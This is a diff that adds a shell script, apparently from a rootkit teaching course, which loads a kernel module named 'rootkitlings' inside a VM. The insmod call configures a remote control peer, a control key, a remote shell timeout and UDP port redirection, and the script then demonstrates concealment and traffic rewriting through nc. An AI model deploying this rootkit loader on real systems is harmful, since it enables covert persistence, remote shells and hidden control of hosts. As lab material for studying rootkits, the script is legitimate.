@@ -1,0 +1,137 @@
+#!/bin/sh
+
+set -eu
+
+# shellcheck source=scripts/lib/ui.sh
+. /vm/ui.sh
+
+profile=${1:-}
+key=${2:-}
+peer=${3:-}
+control_port=${4:-}
+shell_port=${5:-}
+
+request=/etc/modules-load.d/rootkitlings.conf
+sibling=/etc/modules-load.d/.rootkitlings.conf.rootkitlings
+
+show()
+{
+	ui_transcript "$*"
+}
+
+run()
+{
+	show "$@"
+	"$@"
+}
+
+show_enabled_surfaces()
+{
+	while test -r /proc/rootkitlings; do
+		if grep -Fxq 'actions=enabled' /proc/rootkitlings 2>/dev/null; then
+			break
+		fi
+		sleep 0.1
+	done
+	if ! grep -Fxq 'actions=enabled' /proc/rootkitlings 2>/dev/null; then
+		ui_warning 'Module stopped before the C00 demonstration ran'
+		return
+	fi
+
+	ui_heading 'Selected views after enable'
+	show "find /proc -maxdepth 1 -name 'rootkitlings*'"
+	find /proc -maxdepth 1 -name 'rootkitlings*'
+	show 'head -n 3 /proc/rootkitlings_evidence'
+	head -n 3 /proc/rootkitlings_evidence
+
+	demonstrate_udp_redirect
+}
+
+demonstrate_udp_redirect()
+{
+	received=/tmp/rootkitlings-play-udp
+	message='packet routed by C00'
+	listener=
+	sender=
+	rm -f "$received"
+
+	ui_heading 'Enabled UDP rewrite'
+	show 'nc -u -l -p 5401 > /tmp/rootkitlings-play-udp &'
+	nc -u -l -p 5401 > "$received" &
+	listener=$!
+	sleep 0.1
+	show "printf '%s\\n' '$message' | nc -u 127.0.0.1 5400 &"
+	printf '%s\n' "$message" | nc -u 127.0.0.1 5400 &
+	sender=$!
+
+	index=0
+	while test ! -s "$received" && test "$index" -lt 30; do
+		sleep 0.1
+		index=$((index + 1))
+	done
+	kill -9 "$sender" 2>/dev/null || true
+	kill -9 "$listener" 2>/dev/null || true
+	wait "$sender" 2>/dev/null || true
+	wait "$listener" 2>/dev/null || true
+	show 'cat /tmp/rootkitlings-play-udp'
+	cat "$received" 2>/dev/null || true
+	if test "$(cat "$received" 2>/dev/null)" = "$message"; then
+		ui_success 'Datagram sent to 5400 arrived on 5401'
+	else
+		ui_warning 'No redirected datagram was received'
+	fi
+	rm -f "$received"
+}
+
+if test "$profile" != complete-rootkit; then
+	ui_die "Unknown play profile: $profile"
+fi
+
+ui_heading 'Completed course rootkit'
+ui_field 'Control' "$peer:$control_port"
+ui_field 'Shell' "$peer:$shell_port"
+ui_field 'UDP' '127.0.0.1:5400 -> 127.0.0.1:5401'
+
+run mkdir -p /etc/modules-load.d
+run mount -t tmpfs -o nosuid,nodev,noexec,mode=0700 tmpfs \
+	/etc/modules-load.d
+run chmod 0700 /etc/modules-load.d
+show "printf 'operator-original\\n' > $request"
+printf 'operator-original\n' > "$request"
+run chmod 0600 "$request"
+
+ui_heading 'Load request before module load'
+run cat "$request"
+
+run ifconfig lo 127.0.0.1 up
+command='insmod /rootkitlings/rootkitlings.ko'
+command="$command peer_address=$peer peer_port=$control_port"
+command="$command retry_base_ms=25 retry_max_ms=200"
+command="$command control_key=<redacted> shell_timeout_ms=300000"
+command="$command redirect_from_port=5400 redirect_to_port=5401"
+show "$command"
+insmod /rootkitlings/rootkitlings.ko \
+	"peer_address=$peer" \
+	"peer_port=$control_port" \
+	retry_base_ms=25 \
+	retry_max_ms=200 \
+	"control_key=$key" \
+	shell_timeout_ms=300000 \
+	redirect_from_port=5400 \
+	redirect_to_port=5401
+
+ui_heading 'Resident core'
+run head -n 4 /proc/rootkitlings
+run head -n 8 /proc/rootkitlings_agent
+run tail -n 4 /proc/rootkitlings_agent
+
+ui_heading 'Applied load request'
+run cat "$request"
+run cat "$sibling"
+
+ui_heading 'Declared visibility boundary'
+run head -n 13 /proc/rootkitlings_evidence
+
+ui_progress 'Run enable to demonstrate concealment and UDP redirection'
+printf 'ROOTKITLINGS_PLAY_READY\n'
+show_enabled_surfaces
